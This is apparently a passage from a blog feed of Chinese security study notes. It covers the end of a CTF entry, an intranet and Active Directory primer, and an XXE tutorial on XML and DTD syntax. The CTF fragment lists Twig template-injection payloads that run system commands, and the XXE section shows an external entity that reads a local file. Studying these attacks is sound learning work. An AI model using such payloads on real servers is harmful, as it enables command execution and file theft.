class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;exec&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="xml"> //没有回显</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网基础</title>
    <link href="/2021/12/05/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/12/05/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="内网基础"><a href="#内网基础" class="headerlink" title="内网基础"></a>内网基础</h1><p>内网也指局域网(Local Area Network,LAN),是指在某一区域内由多台计算机互连而成的计算机组</p><h2 id="工作组-Work-Group"><a href="#工作组-Work-Group" class="headerlink" title="工作组(Work Group)"></a>工作组(Work Group)</h2><p>在一个大型局域网内，通常会有很多计算机连接组成，他们会列在<strong>网络邻居</strong>中，为了使网络得到有效的管理，对计算机进行分组，于是就产生了工作组。通常按计算机的不同功能进行分组</p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211205230453548.png" style="zoom:50%;" /><p>可以更改工作组的名称加入对应的组，如果组名在网络中不存在，那么相当于新建了一个工作组</p><p><strong>工作组没有服务器和客户机之分，都是处于同一地位，因此不能集中管理</strong></p><h2 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域(Domain)"></a>域(Domain)</h2><p>当一个公司拥有 200 台计算机，需要以一个账号登录每台计算机，得以访问每台计算机的资源，那么就需要每台计算机创建这个账号；当这个账号需要更换密码时，需要对每台计算机进行改密</p><p><strong>域</strong>是一个有安全边界的计算机集合(域安全边界使不同域的用户无法访问另一个域中的资源)，域拥有严格的安全管理机制，用户需要访问域内的资源，必须以合法的身份登录域，域还给每个用户分配不同的身份，因此赋予了不同的资源访问权限</p><p><strong>域控制器(Domain Controller,DC)</strong> 是域中负责验证所有连接到域的计算机和用户，域内的计算机要互相访问也需要域控制器的审核，在域控制器数据库中储存着域的账号、密码以及域中计算机信息等</p><p>只有属于域内的计算机使用合法的账号密码登录，才能访问域内的资源</p><p>域有几种环境：</p><ul><li><strong>单域</strong></li></ul><p>小型网络一个域就可以了，通常由有两台域服务器，一台作为 DC，另一台作为备份 DC</p><ul><li><strong>父域和子域</strong></li></ul><p>处于管理及其他需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域</p><p>比如大公司和其分公司位于不同的地点，就需要使用父域和子域，若把分公司放在一个域内，就会在信息交互上花费较长的时间，占用更多的带宽；当各分公司使用各自的域来管理自己的资源，信息交互的条目相对较少，而且相比在一个域内，可以压缩交互的数据，同时可以自定义各自域的安全策略，比如公司的财务部希望使用特定的安全策略，那么就可以将财务部作为一个子域来单独管理</p><ul><li><strong>域树</strong></li></ul><p>域树(Tree)是多个域通过建立信任关系组成的集合，一个域管理员只能管理本域，不能访问和管理其他域，因此就要域间建立信任关系，两个域就可以互相访问；域树的父域和子域就可以按需互相管理，跨网络分配文件和打印机等设备和资源，从而在不同的域之间实现网络资源的共享与管理、通信和传输</p><p>在一个域树中，父域可以包含多个子域，子域是相对父域来说的</p><p>域 asia.abc.com 的级别比域 abc.com 低(.com 在这里是一级域[最高级子域])，子域只能使用父域的名字作为其域名的后缀，在域树中，域的名字是连续的</p><ul><li><strong>域森林</strong></li></ul><p>域森林(Forest)是指多个域树通过建立信任关系组成的集合</p><p>当一个公司需要兼并时，使用的域树 abc.com，而被兼并的公司域树 abc.net 无法挂在域树 abc.com 下，那么域树 abc.com 与 abc.net 就要通过建立信任关系来构成域森林，通过域树之间的信任关系，可以管理和使用整个域森林中的资源，并保留被兼并公司原有的特色</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/u=2184180237,1938452684&fm=253&app=138&f=PNG.png" alt="5"></p><ul><li><strong>域名服务器</strong></li></ul><p>域名服务器(Domain Name Server,DNS)是指用于实现域名(Domain Name)和与之对应的 IP 地址(IP Address)映射的服务器</p><p>DNS 服务器和 DC 一般配置在同一台机器上</p><p><a href="https://www.cnblogs.com/chenjiangfeng/p/9706483.html">https://www.cnblogs.com/chenjiangfeng/p/9706483.html</a></p><ul><li><strong>活动目录</strong></li></ul><p>活动目录(Active Directory,AD)是指域环境中提供目录服务的组件</p><p>目录存储了网络对象(用户、组、计算机、共享资源、打印机和联系人等)，目录服务是帮助用户快速、准确地从目录中找到其所需要的信息的服务，而活动目录实现了，目录服务，为企业提供了网络中所有资源的快捷方式，用户可以通过寻找快捷方式来定位资源</p><p>活动目录的逻辑结构包括：组织单元(OU)、域、域树、域森林</p><p>活动目录功能有：</p><ol><li>账号集中管理，所有账号储存在服务器中，可以统一执行命令和重置密码</li><li>软件集中管理，统一推送软件，安装网络打印机，利用软件发布策略分发软件，让用户安装软件</li><li>环境集中管理，统一客户端桌面，TCP/IP 协议设置</li><li>增强安全性，统一部署企业杀毒软件，建立计划扫描任务(查杀病毒，更新补丁，释放临时文件)，集中管理用户的权限，对用户密码定制策略，监控网络，对资料统一管理</li><li>及时规避风险，利用活动目录控制用户权限，利用群集、负载均衡对服务器进行容灾设置</li></ol><ul><li><strong>域控制器和活动目录的区别</strong></li></ul><p>安装了 AD，就是 DC 了</p><ul><li><strong>安全域的划分</strong></li></ul><p>划分安全域的目的是将一组安全等级相同的计算机划入同一个网段， 网段内的计算机拥有相同的网络边界，并在网络边界通过部署防火墙来实现对其他安全域的网络访问控制策略(NACL)，允许哪些 IP 访问此域、允许此域访问哪些 IP 地址和网段进行设置</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/fghsdhfghk.jpg"></p><p>一个用路由器连接的内网，可以将网络划分围殴三个区域：安全级别最高的内网；安全级别中等的 DMZ；安全级别最低的外网(Internet)</p><p>DMZ 称为隔离区也称为非军事化区，是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题而设立的一个非安全系统与安全系统之间的缓冲区，放置一些必须公开的服务器设施，例如企业 web 服务器、ftp 服务器和论坛服务器等，因此可以从外部访问 DMZ</p><p>DMZ 的屏障功能：</p><ol><li>内网可以访问外网，需要防火墙执行 NAT</li><li>内网可以访问 DMZ，管理 DMZ 的服务器</li><li>外网不能访问 DMZ，外网访问内网就要通过 VPN 来访问</li><li>外网可以访问 DMZ，外网必须可以访问 DMZ，并且由防火墙实现对外地址到服务器地址的转换</li><li>DMZ 不能访问内网，如果不执行此策略时，攻陷 DMZ，内网将不能受到保护</li><li>DMZ 不能访问外网，例外：当 DMZ 有邮件服务器时，就要允许访问外网</li></ol><p>内网又分为办公区和核心区：</p><ol><li>公司员工工作区，会安装防病毒软件、主机入侵检测产品，如果部分办公区可以访问核心数据区(运维人员)，则会部署堡垒机</li></ol><blockquote><p>堡垒机，也叫做运维安全审计系统，它的核心功能是 4A：</p><ol><li>身份验证 Authentication</li><li>账号管理 Account</li><li>授权控制 Authorization</li><li>安全审计 Audit</li></ol><p>堡垒机是用来控制哪些人可以登录哪些资产（事先防范和事中控制），以及录像记录登录资产后做了什么事情（事后溯源）</p></blockquote><ol start="2"><li>核心区，存储最重要的数据、文档，有日志记录、安全审计等安全措施进行严格保护，往往只有少数内网主机可以访问</li></ol><ul><li><strong>域中计算机的分类</strong></li></ul><p>域控制器、成员服务器、客户机、独立服务器</p><p>域控制器是必须要有的，其他三种可以没有</p><ul><li><strong>域内权限</strong></li></ul><p><strong>组(group)</strong> 是用户账号的集合。通过向一组用户分配权限，就不用向每个用户分配权限</p><ol><li><strong>域本地组</strong></li></ol><p>多域用户访问单域资源(访问同一个域)，可以从任何域添加用户账号、通用组和全局组，但只能在其所在域内指派权限。域本地组不能嵌套在其他组中。域本地组主要用于授予本域内资源的访问权限</p><ol start="2"><li><strong>全局组</strong></li></ol><p>单域用户访问多域资源(必须是同一个域中的用户)，只能在创建该全局组的域中添加用户和全局组的域中添加用户和全局组。可以在域森林的任何域内指派权限。全局组可以嵌套在其他组中。</p><ol start="3"><li><strong>通用组</strong></li></ol><p>通用组的成员来自域森林中任何域的用户账号、全局组和其他通用组，可以在该域森林的任何域中指派权限，可以嵌套在其他组中，非常适合在域森林内的跨域访问中使用。通用组的成员不是保存在各自的域控制器中的，而是保存在全局编录(GC)中的，任何变化都会导致全林复制</p><p><strong>域本地组来自全林，作用于本域；全局组来自本域，作用于全林；通用组来自全林，作用于全林</strong></p><ol start="4"><li><strong>A-G-DL-P 策略</strong></li></ol><p>A-G-DL-P 策略是指将用户账号添加到全局组中，然后为域本地组分配资源权限</p><ul><li><p>A(account)，表示用户账号</p></li><li><p>G(Global Group)，表示全局组</p></li><li><p>U(Universal Group)，表示通用组</p></li><li><p>DL(Domain Local Group)，表示域本地组</p></li><li><p>P(Permission，许可)，表示资源权限。</p></li></ul><p>在安装域控制器时，系统会自动生成一些组，称为内置组。内置组定义了一些常用的权限。 把成员添加进内置组，成员就会取得内置组的权限。</p><ul><li><p>域本地组权限</p><p>Administrators(管理员组)</p><p>Remote Desktop Users(远程登录组)</p><p>Print Operators(打印机操作员组)</p><p>Account Operators(帐号操作员组)</p><p>Server Operaters(服务器操作员组)</p><p>Backup Operators(备份操作员组)</p></li><li><p>全局组、通用组的权限</p><p>Domain Admins(域管理员组)</p><p>Enterprise Admins(企业系统管理员组)</p><p>Schema Admins(架构管理员组)</p><p>Domain Users(域用户组)</p></li></ul><h2 id="简单的单域环境搭建"><a href="#简单的单域环境搭建" class="headerlink" title="简单的单域环境搭建"></a>简单的单域环境搭建</h2><p>更改计算机名为DC</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220403191515686.png"></p><p>设置静态IP</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220403191820676.png"></p><p>添加AD和DNS角色</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220403191247089.png"></p><p>AD DS升级工作组为域(图片随便找的，图中IP与我设置不对应)</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220403191608372.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220403192127219.png"></p><p>添加一个用户test</p><p>升级完后，windows系统加入单域环境(设置的网卡、网段要一致)</p><p>加入域输入test用户的账号密码</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220403192056363.png"></p><p>然后会要求重启，以域用户登录<code>QWE\test</code>即可</p><blockquote><p>net time /domain</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2021/12/04/XXE/"/>
    <url>/2021/12/04/XXE/</url>
    
    <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><p>XML 指可扩展标记语言（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage）， 被设计用来传输和存储数据。区别于用来显示数据的 html</p><p>作用： 当作小型的数据库使用，如 msg 聊天工作通过 xml 文件在本地保留聊天记录，软件的配置文件 xmk，通讯软件通过 xml 文件保留用户之前看到的媒体信息，在网站当中当作 “接口” 服务，XML 文件作为配置文件（Spring、Struts2 等）、文档结构说明文件（PDF、RSS 等）、图片格式文 件（SVG header）应用比较广泛。</p><p>实例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Math<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>me<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>vendor<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>pass the exam!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>第一行是 XML 声明(可选)，定义了 XML 的版本以及使用的编码，note 是文档的根元素<code>&lt;note&gt;</code>(说明本文档是一个便笺)</p><p>子元素：<code>&lt;to&gt; &lt;from&gt; &lt;heading&gt; &lt;body&gt;</code></p><blockquote><p>注意：XML 标签对大小写敏感，属性值须加引号</p></blockquote><p>单独的 XML 文档不会被浏览器解析，直接被当作文本输出</p><p>可以配合 CSS 格式化 XML 输出</p><blockquote><p>&lt;?xml-stylesheet type=”text/css” href=”cd_catalog.css”?&gt;</p></blockquote><p>但更常用的是使用 XSLT 转换 XML 文档用以 HTML 格式显示</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211205150958245.png"></p><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><h2 id="DTD-基本概念"><a href="#DTD-基本概念" class="headerlink" title="DTD 基本概念"></a>DTD 基本概念</h2><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br>DTD 用来为 XML 文档定义语义约束。可以嵌入在 XML 文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是 XML 文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p><h2 id="元素声明"><a href="#元素声明" class="headerlink" title="元素声明"></a>元素声明</h2><h3 id="声明一个元素"><a href="#声明一个元素" class="headerlink" title="声明一个元素"></a>声明一个元素</h3><p>在 DTD 中，XML 元素通过元素声明来进行声明。元素声明使用下面的语法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> <span class="hljs-meta-keyword">category</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">element-content</span>)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="空元素"><a href="#空元素" class="headerlink" title="空元素"></a>空元素</h3><p>空元素通过类别关键词 EMPTY 进行声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> <span class="hljs-meta-keyword">EMPTY</span>&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">br</span> <span class="hljs-meta-keyword">EMPTY</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="只有-PCDATA-的元素"><a href="#只有-PCDATA-的元素" class="headerlink" title="只有 PCDATA 的元素"></a>只有 PCDATA 的元素</h3><p>只有 PCDATA 的元素通过圆括号中的 #PCDATA 进行声明：</p><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="带有任何内容的元素"><a href="#带有任何内容的元素" class="headerlink" title="带有任何内容的元素"></a>带有任何内容的元素</h3><p>通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="带有子元素（序列）的元素"><a href="#带有子元素（序列）的元素" class="headerlink" title="带有子元素（序列）的元素"></a>带有子元素（序列）的元素</h3><p>带有一个或多个子元素的元素通过圆括号中的子元素名进行声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child1</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child1</span>,<span class="hljs-meta-keyword">child2</span>,...)&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>当子元素按照由逗号分隔开的序列进行声明时，这些子元素必须按照相同的顺序出现在文档中。在一个完整的声明中，子元素也必须被声明，同时子元素也可拥有子元素。”note” 元素的完整声明是：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span>      (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span>    (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">heading</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span>    (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="声明只出现一次的元素"><a href="#声明只出现一次的元素" class="headerlink" title="声明只出现一次的元素"></a>声明只出现一次的元素</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子声明了：message 子元素必须出现一次，并且必须只在 “note” 元素中出现一次。</p><h3 id="声明最少出现一次的元素"><a href="#声明最少出现一次的元素" class="headerlink" title="声明最少出现一次的元素"></a>声明最少出现一次的元素</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>+)&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>+)&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子中的加号（+）声明了：message 子元素必须在 “note” 元素内出现至少一次。</p><h3 id="声明出现零次或多次的元素"><a href="#声明出现零次或多次的元素" class="headerlink" title="声明出现零次或多次的元素"></a>声明出现零次或多次的元素</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>*)&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>*)&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子中的星号（*）声明了：子元素 message 可在 “note” 元素内出现零次或多次。</p><h3 id="声明出现零次或一次的元素"><a href="#声明出现零次或一次的元素" class="headerlink" title="声明出现零次或一次的元素"></a>声明出现零次或一次的元素</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>?)&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>?)&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子中的问号(?)声明了：子元素 message 可在 “note” 元素内出现零次或一次。</p><h3 id="声明”非…-即…”类型的内容"><a href="#声明”非…-即…”类型的内容" class="headerlink" title="声明”非…/即…”类型的内容"></a>声明”非…/即…”类型的内容</h3><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">header</span>,(<span class="hljs-meta-keyword">message</span>|<span class="hljs-meta-keyword">body</span>))&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子声明了：”note” 元素必须包含 “to” 元素、”from” 元素、”header” 元素，以及非 “message” 元素即 “body” 元素。</p><h3 id="声明混合型的内容"><a href="#声明混合型的内容" class="headerlink" title="声明混合型的内容"></a>声明混合型的内容</h3><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">#PCDATA</span>|<span class="hljs-meta-keyword">to</span>|<span class="hljs-meta-keyword">from</span>|<span class="hljs-meta-keyword">header</span>|<span class="hljs-meta-keyword">message</span>)*&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子声明了：”note” 元素可包含出现零次或多次的 PCDATA、”to”、”from”、”header” 或者 “message”。</p><h2 id="属性声明"><a href="#属性声明" class="headerlink" title="属性声明"></a>属性声明</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></code></pre></td></tr></table></figure><p>DTD 实例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST <span class="hljs-meta-keyword">payment</span> <span class="hljs-meta-keyword">Luckey</span> <span class="hljs-meta-keyword">CDATA</span> <span class="hljs-meta-string">&quot;Q&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>XML 实例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">Luckey</span>=<span class="hljs-string">&quot;Q&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><h3 id="引用方式"><a href="#引用方式" class="headerlink" title="引用方式"></a>引用方式</h3><p>XML 元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML 用实体引用（entity reference）替换特殊字符。XML 预定义五个实体引用，即用<code>&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot;</code> 替换 <code>&lt; &gt; &amp; &#39; &quot;</code><br>实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行</p><ul><li><p><input checked="" disabled="" type="checkbox">  外部引用</p></li><li><p>网络上 DTD 文件</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;DTD_ID&quot;</span> <span class="hljs-meta-string">&quot;DTD_url&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>外部 DTD 文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTD本地路径&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>XML version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;file:///var/www/html/XML.dtd&quot;</span> &gt;]&gt;<br>&lt;creds&gt;<br>    &lt;user&gt;&amp;xxe;&lt;/user&gt;<br>    &lt;pass&gt;mypass&lt;/pass&gt;<br>&lt;/creds&gt;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root-element</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;XML.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span 